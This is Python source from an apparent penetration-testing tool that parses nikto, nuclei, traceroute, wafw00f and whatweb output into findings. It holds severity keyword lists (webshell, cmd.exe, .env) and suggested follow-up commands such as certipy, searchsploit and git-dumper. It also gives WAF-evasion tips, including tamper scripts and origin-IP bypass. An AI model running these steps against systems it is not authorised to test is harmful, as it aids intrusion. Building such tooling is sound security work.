        # 'Target Hostname', 'Target IP', 'Target Port', 'Start Time',
        # 'End Time', 'Nikto v', 'Platform', 'Server:', plus the raw
        # 'Your Nikto installation is out of date' nag.
        SKIP_PREFIXES = (
            "- Nikto v",
            "+ Your Nikto installation",
            "+ Target IP",
            "+ Target Hostname",
            "+ Target Port",
            "+ Start Time",
            "+ End Time",
            "+ Platform",
            "+ 1 host(s) tested",
            "+ No CGI Directories",
        )

        # Pull lines starting with '+ [NNNNN]' (findings) plus a few
        # selected unnumbered '+ ' lines that carry useful info
        # (Server: version, OPTIONS methods, default install flags).
        FINDING_RE = re.compile(r"^\+\s*\[(\d+)\]\s*(.+)$")
        KEEP_UNNUM_RE = re.compile(
            r"^\+\s*(Server:|OPTIONS:\s*Allowed|OPTIONS:\s*Public|"
            r"Appears to be a default)")

        findings = []          # list of (code|"-", text)
        server_banner = ""
        for _, raw in log:
            line = self._strip_ansi(raw).rstrip()
            if not line or line.startswith(SKIP_PREFIXES):
                continue
            # Record server banner separately so we can promote it
            # to the top of the description.
            if line.startswith("+ Server:") and not server_banner:
                server_banner = line[1:].strip()
                continue
            m = FINDING_RE.match(line)
            if m:
                findings.append((m.group(1), m.group(2).strip()))
                continue
            if KEEP_UNNUM_RE.match(line):
                findings.append(("-", line[1:].strip()))

        # Detect explicit failures so we emit a useful finding even
        # when nikto couldn't connect at all (wrong port, TLS mismatch,
        # target down).  Without this, a "+ [FAIL] Unable to connect"
        # log would produce zero findings and fall back to the generic
        # banner-dump parser.
        text_low = "\n".join(
            self._strip_ansi(ln).lower() for _, ln in log
        )
        conn_fail = (
            "unable to connect" in text_low or
            "connection refused" in text_low or
            "no web server found" in text_low or
            "ssl_read(): connection reset" in text_low or
            "host unreachable" in text_low
        )

        if not findings and not server_banner:
            if conn_fail:
                web_label = self._extract_web_target_label(tool)
                desc = (
                    f"nikto could not connect to the target.\n"
                    f"\n"
                    f"Common causes:\n"
                    f"  • Wrong scheme/port combo (e.g. running "
                    f"`nikto -ssl` against a plain-HTTP port 80)\n"
                    f"  • HTTPS service on a non-standard port that "
                    f"HAWK didn't detect — specify manually\n"
                    f"  • Target filtering HEAD/GET from Kali's IP\n"
                    f"  • Service is down\n"
                    f"\n"
                    f"What to do:\n"
                    f"  • Run NMAP Service+Scripts to confirm the real\n"
                    f"    HTTPS port, then re-run NIKTO (SSL) — HAWK\n"
                    f"    will target the right endpoint this time.\n"
                    f"  • For plain HTTP, use NIKTO (not the SSL card)."
                )
                title = f"{tool.name} — connection failed on {web_label}"
                self.app.after(0,
                    lambda: self.app.target_intel.add_auto_finding(
                        title=title, description=desc,
                        severity="info", source=tool.name))
                self.app.terminal.write(
                    f"  [!] {tool.name} — connection failed (no "
                    f"reachable service on this scheme/port).", "warn")
                return True
            return False        # truly unknown state — let caller decide

        # ── Noise filtering ──────────────────────────────────────────
        # Nikto emits many "informational" findings that create noise
        # without actionable value.  We separate findings into:
        #   high_items  — real vulnerabilities / interesting endpoints
        #   medium_items — header issues, version disclosure
        #   noise       — OSVDB stubs, generic anti-clickjacking, etc.
        # Noise is counted but not listed individually.
        NOISE_KW = (
            "osvdb-", "anti-clickjacking",
            "x-content-type-options header",
            "x-xss-protection header",
            "strict-transport-security",
            "uncommon header",
            "retrieved x-powered-by",
            "retrieved x-aspnet-version",
            "the site uses ssl",
            "hostname found in http cookies",
            "cookie does not have",
            "allowed http methods",
            "entry '/icons/' in robots.txt",
            "entry '/' in robots.txt",
            "no cgi directories found",
        )
        HIGH_KW = ("rce", "remote code", "sql injection", "traversal",
                   "phpmyadmin", ".git/", ".env", "upload",
                   "backdoor", "default cred", "default password",
                   "active directory certificate services",
                   "/shell", "webshell", "cmd.exe", "/cgi-bin/",
                   "xmlrpc", "wp-login", "wp-admin", "/admin",
                   "/manager", "/console", "phpinfo", "server-status")
        MEDIUM_KW = ("disclosed", "missing", "httponly", "xss",
                     "clickjacking", "mime sniffing", "x-frame",
                     "csrf", "directory indexing", "autoindex",
                     "obsolete", "out of date", "debug", "trace method",
                     "options method")

        high_items = []
        medium_items = []
        noise_items = []
        for code, text in findings:
            tlow = text.lower()
            if any(k in tlow for k in NOISE_KW):
                noise_items.append((code, text))
            elif any(k in tlow for k in HIGH_KW):
                high_items.append((code, text))
            elif any(k in tlow for k in MEDIUM_KW):
                medium_items.append((code, text))
            else:
                medium_items.append((code, text))

        real_count = len(high_items) + len(medium_items)

        # ── Severity classification ─────────────────────────────────
        severity = "info"
        if high_items:
            severity = "high"
        elif medium_items:
            severity = "medium"

        # ── Build description ───────────────────────────────────────
        parts = []
        if server_banner:
            parts.append(server_banner)
            parts.append("")

        if high_items:
            parts.append("★ HIGH-INTEREST findings:")
            for code, text in high_items[:20]:
                tag = f"[{code}] " if code != "-" else ""
                parts.append(f"  {tag}{text}")
            if len(high_items) > 20:
                parts.append(f"  ... and {len(high_items) - 20} more")
            parts.append("")

        if medium_items:
            parts.append(f"Notable findings ({len(medium_items)}):")
            for code, text in medium_items[:20]:
                tag = f"[{code}] " if code != "-" else ""
                parts.append(f"  {tag}{text}")
            if len(medium_items) > 20:
                parts.append(f"  ... and {len(medium_items) - 20} more")

        if noise_items:
            parts.append("")
            parts.append(
                f"ℹ {len(noise_items)} low-value items filtered "
                f"(missing headers, OSVDB stubs, cookie flags). "
                f"Re-run with -Display V for full output.")

        # Useful next-step hints
        combined = " | ".join(t for _, t in findings).lower()
        next_steps = []
        if "active directory certificate services" in combined:
            next_steps.append(
                "/certsrv endpoint exposed → AD CS Web Enrollment. "
                "Run Certipy to enumerate ESC1-ESC11 templates:\n"
                f"    certipy find -u <user>@<domain> -p <pass> "
                f"-dc-ip <dc_ip>")
        if "default iis" in combined or "iisstart" in combined:
            next_steps.append(
                "IIS default install — no custom content. Try vhost "
                "enumeration (ffuf Host header) before deeper scans.")
        if server_banner and "iis/7.5" in server_banner.lower():
            next_steps.append(
                "IIS 7.5 → Windows Server 2008 R2 / 2008. Check for "
                "CVE-2017-7269 (WebDAV BOF, MS17-016), CVE-2015-1635 "
                "(HTTP.sys, MS15-034), and IIS short-name 8.3 "
                "disclosure.")
        if next_steps:
            parts.append("")
            parts.append("— Next steps —")
            for ns in next_steps:
                parts.append(f"  • {ns}")

        desc = "\n".join(parts).rstrip()
        web_label = self._extract_web_target_label(tool)
        # Stable title — count + filtered details go in the description.
        title = f"{tool.name} on {web_label}"

        self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
            title=title, description=desc,
            severity=severity, source=tool.name))
        self.app.terminal.write(
            f"  [+] {tool.name} — {real_count} real + "
            f"{len(noise_items)} noise items → Target Intel.", "success")
        return True

    def _parse_nuclei_to_intel(self, tool, log: list) -> bool:
        """Extract nuclei template matches into Target Intel.

        Nuclei output lines (after ANSI strip) look like:
          [template-id] [protocol] [severity] URL [matched-content]
        e.g.:
          [CVE-2021-44228] [http] [critical] https://target/ ["<value>"]
          [exposed-git]    [http] [medium]   http://target/.git/config
          [tech-detect:wp] [http] [info]     http://target/  [wp 5.8]

        Everything else (banner, [INF] template count, dns lookups,
        projectdiscovery.io…) is ignored.
        """
        import re
        FINDING_RE = re.compile(
            r"^\s*\[(?P<tid>[^\]]+)\]\s*"
            r"\[(?P<proto>[a-zA-Z0-9_\-]+)\]\s*"
            r"\[(?P<sev>info|low|medium|high|critical|unknown)\]\s*"
            r"(?P<url>\S+)"
            r"(?:\s+\[(?P<match>[^\]]*)\])?",
            re.I,
        )

        findings = []  # list of dicts
        for _, raw in log:
            line = self._strip_ansi(raw).strip()
            if not line:
                continue
            # Skip [INF] / [WRN] / [ERR] progress lines — they're not matches.
            if line.startswith(("[INF]", "[WRN]", "[ERR]", "[FTL]", "[VER]", "[DBG]")):
                continue
            if self._is_ascii_banner_line(line):
                continue
            m = FINDING_RE.match(line)
            if not m:
                continue
            findings.append({
                "tid":   m.group("tid").strip(),
                "proto": m.group("proto").lower(),
                "sev":   m.group("sev").lower(),
                "url":   m.group("url").strip(),
                "match": (m.group("match") or "").strip(),
            })

        if not findings:
            # Nothing parsed — let the generic parser run (it'll skip banner
            # lines too now that the detector is ANSI-aware).
            return False

        # Bucket by severity, preserving first-seen order.
        order = ["critical", "high", "medium", "low", "info", "unknown"]
        by_sev = {k: [] for k in order}
        for f in findings:
            by_sev.setdefault(f["sev"], []).append(f)

        top_sev = next((s for s in order if by_sev.get(s)), "info")

        web_label = self._extract_web_target_label(tool)
        parts  = []
        counts = " · ".join(
            f"{len(by_sev[s])} {s}" for s in order if by_sev.get(s))
        parts.append(f"Nuclei matches: {counts}")

        for s in order:
            bucket = by_sev.get(s) or []
            if not bucket:
                continue
            parts.append(f"\n── {s.upper()} ({len(bucket)}) ──")
            for f in bucket[:25]:
                extra = f"  → {f['match']}" if f["match"] else ""
                parts.append(f"  [{f['tid']}] {f['url']}{extra}")
            if len(bucket) > 25:
                parts.append(f"  … and {len(bucket) - 25} more {s} findings")

        # Action suggestions keyed on the template id.
        suggestions = []
        for f in findings:
            tid = f["tid"].lower()
            if tid.startswith("cve-"):
                suggestions.append(
                    f"searchsploit {f['tid']}   "
                    f"# or msf search cve:{f['tid'].split('-',1)[1]}")
            elif "default-login" in tid or tid.endswith("-default"):
                suggestions.append(
                    f"# try default creds against {f['url']}")
            elif "exposed-git" in tid or "git-config" in tid:
                suggestions.append(
                    f"git-dumper {f['url']} ./loot_git")
            elif "takeover" in tid:
                suggestions.append(
                    f"# confirm subdomain takeover on {f['url']}")
        # dedup preserving order
        seen = set(); uniq = []
        for s in suggestions:
            if s not in seen:
                seen.add(s); uniq.append(s)
        if uniq:
            parts.append("\nNext steps:")
            parts += [f"  $ {c}" for c in uniq[:10]]

        desc = "\n".join(parts)
        # Stable title — count + top severity stay in the description.
        title = f"NUCLEI on {web_label}"

        self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
            title=title, description=desc,
            severity=top_sev if top_sev in (
                "critical","high","medium","low","info") else "info",
            source=tool.name))

        self.app.terminal.write(
            f"  [+] Nuclei — {len(findings)} template match"
            f"{'es' if len(findings) != 1 else ''} "
            f"(top severity: {top_sev}).", "success")
        return True

    def _parse_traceroute_to_intel(self, tool, log: list) -> bool:
        """
        Build a meaningful Target Intel entry from traceroute output instead
        of dumping the first 6 raw hop lines. Counts replies vs stars, notes
        whether the final hop was reached, suggests -T/-I alternatives.
        """
        import re
        if not hasattr(self.app, "target_intel"):
            return False

        target = self._get_target() or "target"

        total = 0
        stars = 0
        replies = []
        final_reached = False
        last_reply_ip = None
        trace_target = None

        for level, line in log:
            l = line.strip()
            if not l:
                continue
            m0 = re.match(r'traceroute to\s+(\S+)', l, re.I)
            if m0:
                trace_target = m0.group(1)
                continue
            m = re.match(r'^\s*(\d+)\s+(.*)$', l)
            if not m:
                continue
            hop_num = int(m.group(1))
            rest = m.group(2)
            total = max(total, hop_num)
            if "* * *" in rest or re.fullmatch(r'(\*\s*)+', rest):
                stars += 1
            else:
                ip_match = re.search(r'(\d{1,3}(?:\.\d{1,3}){3})', rest)
                if ip_match:
                    last_reply_ip = ip_match.group(1)
                    replies.append((hop_num, last_reply_ip))
                    if trace_target and last_reply_ip == trace_target:
                        final_reached = True

        if total == 0:
            return False   # parser saw nothing — let generic fallback run

        # Build summary
        parts = []
        parts.append(f"Target: {trace_target or target}")
        parts.append(f"Hops probed:      {total}")
        parts.append(f"Replies received: {len(replies)}")
        parts.append(f"Silent (* * *):   {stars}")
        parts.append(f"Final hop reached: {'YES' if final_reached else 'NO'}")

        if replies:
            shown = ", ".join(f"{h}→{ip}" for h, ip in replies[:6])
            parts.append(f"\nResponding routers: {shown}")

        parts.append("")
        if stars == total:
            parts.append("Every hop returned * * *. The path is invisible: either the "
                         "target is offline/unreachable, or all intermediate routers "
                         "drop ICMP-TTL-exceeded, or a firewall silently discards the probe.")
            severity = "low"
        elif stars >= total * 0.4:
            parts.append(f"{stars}/{total} hops were silent. Likely ICMP rate-limiting "
                         "or a filtering firewall between you and the target.")
            severity = "info"
        else:
            parts.append(f"Path mostly clean — only {stars} silent hop(s). "
                         "No significant filtering detected.")
            severity = "info"

        if not final_reached and trace_target:
            parts.append(f"\nTarget {trace_target} never answered on the last hop. "
                         "The final router or the target itself is filtering trace probes.")

        parts.append("\nAlternative probes:")
        parts.append(f"  $ traceroute -T -p 80 {trace_target or target}    # TCP/80")
        parts.append(f"  $ traceroute -I {trace_target or target}          # ICMP echo")
        parts.append(f"  $ tcptraceroute {trace_target or target} 443")

        parts.append("\nOPSEC: traceroute logs your source IP on every intermediate "
                     "router. Use a VPN/pivot in real engagements.")

        # Keep the title stable across re-runs on the same target so Target
        # Intel deduplicates naturally (dedup is title-based). Hop/reply
        # counts live in the description.
        title = f"TRACEROUTE → {trace_target or target}"
        desc  = "\n".join(parts)

        # If a previous traceroute finding for this target exists, drop it so
        # the most recent run wins (stale hop counts are misleading).
        try:
            ai = self.app.target_intel
            ai._auto_findings = [f for f in ai._auto_findings
                                 if f["title"].lower() != title.lower()]
        except Exception:
            pass

        self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
            title=title, description=desc,
            severity=severity, source=tool.name))
        return True

    _ANSI_RE = re.compile(r"\x1b\[[0-9;]*[A-Za-z]")

    @staticmethod
    def _strip_ansi(s: str) -> str:
        return CardWebParserMixin._ANSI_RE.sub("", s) if s else s

    def _parse_wafw00f_output(self, log: list, tool=None):
        """Push wafw00f results into Target Intel.

        Three cases we want visible in the Intel panel:
          1. WAF identified: "The site ... is behind <VENDOR> (Vendor Name) WAF"
          2. WAF hinted but unknown: "Generic Detection results: ... seems to be
             behind a WAF or some sort of security solution"
          3. No WAF: "No WAF detected by the generic detection"

        ``tool`` is optional but recommended — when set, we use it to
        derive a scope-rich title (full URL) so re-running wafw00f
        on a different vhost/port lands as a separate finding.
        """
        import re
        if not hasattr(self.app, "target_intel"):
            return

        # Scope-rich label for finding titles.  Falls back gracefully
        # when no tool was passed (legacy callers).
        if tool is not None:
            try:
                target = self._extract_web_target_label(tool)
            except Exception:
                target = self._get_target() or "target"
        else:
            target = self._get_target() or "target"
        text = "\n".join(l for _, l in log)
        low  = text.lower()

        # (1) Vendor-identified WAF — highest signal.
        m = re.search(
            r"is behind\s+(.+?)\s+(?:\(|waf|web application firewall)",
            text, re.I)
        vendors = []
        if m:
            vendors.append(m.group(1).strip().strip("'\""))
        # wafw00f can also print "Identified WAF: <name>"
        for nm in re.findall(r"Identified WAF:\s*([^\r\n]+)", text, re.I):
            vendors.append(nm.strip())

        # Number of probes wafw00f ran — useful to contextualise confidence.
        probes_m = re.search(r"Number of requests:\s*(\d+)", text, re.I)
        probes = int(probes_m.group(1)) if probes_m else 0
        probes_str = f" ({probes} probes sent)" if probes else ""

        # (1) Vendor-identified WAF — highest signal.
        if vendors:
            uniq = []
            for v in vendors:
                if v and v not in uniq:
                    uniq.append(v)
            vendor_list = ", ".join(uniq)
            self.app.target_intel.add_auto_finding(
                title=f"WAF detected: {vendor_list} on {target}",
                description=(
                    f"Verdict:    WAF PRESENT{probes_str}\n"
                    f"Vendor:     {vendor_list}\n"
                    f"Confidence: 95% — vendor-specific fingerprint matched\n"
                    "\n"
                    "What this means:\n"
                    "  Aggressive web scans (nikto, sqlmap, nuclei) will be\n"
                    "  detected and likely blocked or rate-limited.\n"
                    "\n"
                    "Next steps:\n"
                    "  • Lower rate:   --rate 1   (sqlmap),   -t 1   (nikto)\n"
                    "  • Custom User-Agent to bypass UA blacklists\n"
                    "  • Tamper scripts:  sqlmap --tamper=space2comment\n"
                    "  • Origin-IP bypass: find the real backend IP and\n"
                    "    connect directly (skips the CDN/WAF layer)\n"
                    "  • Switch to manual probing via Burp Suite"),
                severity="medium",
                source="wafw00f")
            # Also show the dialog (original behaviour) so the user can
            # confirm/override before the next noisy scan launches.
            self.after(100, self._show_waf_dialog)
            return

        # (2) Generic/unknown WAF hint.
        if ("seems to be behind a waf" in low
                or "seems to be behind some" in low
                or "behind a waf or some sort" in low):
            self.app.target_intel.add_auto_finding(
                title=f"Possible WAF on {target} (vendor unknown)",
                description=(
                    f"Verdict:    WAF SUSPECTED{probes_str}\n"
                    f"Vendor:     Unknown — no signature matched\n"
                    f"Confidence: 60% — generic anomaly detection only\n"
                    "\n"
                    "What this means:\n"
                    "  Something between you and the target is filtering\n"
                    "  or altering responses, but wafw00f can't pin it to\n"
                    "  a known product.  Could be a custom WAF, a reverse\n"
                    "  proxy, or aggressive caching (Varnish, CDN).\n"
                    "\n"
                    "Next steps:\n"
                    "  • Try payload-based probe:  curl 'http://.../?q=<script>'\n"
                    "  • Check Server / Via / X-Cache headers\n"
                    "  • Run nuclei with -severity info to fingerprint the\n"
                    "    edge technology:  nuclei -u http://<target> -tags tech\n"
                    "  • Proceed cautiously with aggressive scans"),
                severity="info",
                source="wafw00f")
            self.after(100, self._show_waf_dialog)
            return

        # (3) No WAF — useful green light for aggressive enumeration.
        if "no waf detected" in low:
            self.app.target_intel.add_auto_finding(
                title=f"No WAF on {target}",
                description=(
                    f"Verdict:    NO WAF DETECTED{probes_str}\n"
                    f"Confidence: 90% — all generic probes returned clean\n"
                    "\n"
                    "What this means:\n"
                    "  No HTTP(S)-layer WAF intercepting requests.  Note\n"
                    "  this does NOT rule out a network firewall (see the\n"
                    "  Defense Alerts panel for L3/L4 detection).\n"
                    "\n"
                    "Next steps:\n"
                    "  • Green-light for aggressive web tooling:\n"
                    "      nikto, nuclei, sqlmap, gobuster, ffuf\n"
                    "  • No need for bypass tamper scripts / rate-limits.\n"
                    "  • Rare edge case: a very well-tuned WAF that lets\n"
                    "    wafw00f's generic probes through unchanged —\n"
                    "    doubt this if the target is a high-value asset."),
                severity="info",
                source="wafw00f")

    def _parse_whatweb_to_intel(self, tool, log: list) -> bool:
        """Extract web-fingerprint tokens from whatweb's one-line banner and
        push a structured finding into Target Intel.

        whatweb's normal output is a single line:
          http://TARGET:PORT [STATUS] Plugin[value], OtherPlugin[v], ...
        Each `Plugin[value]` token is a detected technology (HTTPServer,
        Apache, PHP, WordPress, JQuery, ...). The generic parser treats
        this as info-severity with too few lines and drops it; here we
        elevate selected tokens and always record at least a summary.
        """
        import re
        if not hasattr(self.app, "target_intel"):
            return False

        # Concatenate the log text. whatweb sometimes wraps onto multiple
        # lines on narrow TTYs — Plugin[value] tokens survive either way.
        full = "\n".join(l for _lvl, l in log if l and l.strip())
        if not full:
            return False

        # Extract Plugin[value] pairs. Allow nested brackets like
        # Microsoft-IIS[7.5][Under Construction] by requiring the inner
        # value to be anything up to the first closing bracket.
        plugins = re.findall(r"([A-Z][A-Za-z0-9\-_]+)\[([^\]]+)\]", full)
        if not plugins:
            return False

        # De-duplicate while preserving first-seen order.
        seen = set()
        dedup: list[tuple[str, str]] = []
        for name, val in plugins:
            key = (name.lower(), val.lower())
            if key in seen:
                continue
            seen.add(key)
            dedup.append((name, val))

        target = self._get_target() or "target"

        # Identify interesting tokens for a headline server string and for
        # severity elevation.
        server_hint = ""
        for n, v in dedup:
            if n.lower() in ("httpserver", "apache", "nginx", "iis",
                             "microsoft-iis", "litespeed", "caddy"):
                server_hint = f"{n}={v}"
                break

        title_hint = next((v for n, v in dedup if n.lower() == "title"), "")
        powered    = next((v for n, v in dedup
                           if n.lower() == "x-powered-by"), "")

        # Technology stack list (kept short for readability)
        lines = []
        if server_hint:
            lines.append(f"Server:      {server_hint}")
        if title_hint:
            lines.append(f"Title:       {title_hint}")
        if powered:
            lines.append(f"X-Powered-By: {powered}")
        # The rest, capped.
        tail = [f"{n}[{v}]" for n, v in dedup
                if n.lower() not in ("httpserver", "title", "x-powered-by",
                                     "country", "ip", "apache", "nginx",
                                     "microsoft-iis", "iis")]
        if tail:
            lines.append("")
            lines.append("Other plugins:")
            lines.append("  " + ", ".join(tail[:12])
                         + (" ..." if len(tail) > 12 else ""))

        # Severity: info by default. Bump to medium when fingerprint reveals
        # a CMS or a software version (common pivot for searchsploit).
        all_low = full.lower()
        severity = "info"
        if any(k in all_low for k in (
                "wordpress[", "drupal[", "joomla[", "phpmyadmin[",
                "jenkins[", "tomcat[", "weblogic[", "coldfusion[")):
            severity = "medium"
        # Explicit CVE-worthy old server bump
        if re.search(r"microsoft-iis\[([4-7]\.|6\.0|7\.0|7\.5)",
                     all_low):
            severity = "medium"

        # Pick a short target URL for the finding title.
        url_match = re.search(r"https?://\S+", full)
        url = url_match.group(0) if url_match else target

        self.app.target_intel.add_auto_finding(
            title=f"Web technology fingerprint — {url}",
            description="\n".join(lines) if lines
                         else ", ".join(f"{n}[{v}]" for n, v in dedup[:10]),
            severity=severity,
            source="whatweb")
        return True

